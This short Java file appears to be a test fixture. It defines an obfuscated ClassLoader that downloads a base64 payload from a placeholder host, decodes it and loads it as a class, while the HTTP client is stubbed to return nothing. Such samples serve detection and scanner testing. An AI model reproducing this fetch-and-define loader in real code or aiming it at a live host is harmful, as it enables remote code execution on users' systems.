package example;

import java.util.Base64;

public final class a extends ClassLoader {
    public Class<?> b() {
        String encoded = FixtureHttpClient.get("https://loader.example.invalid/payload");
        byte[] value = Base64.getDecoder().decode(encoded);
        return defineClass(value, 0, value.length);
    }
}

final class FixtureHttpClient {
    static String get(String endpoint) { return ""; }
}
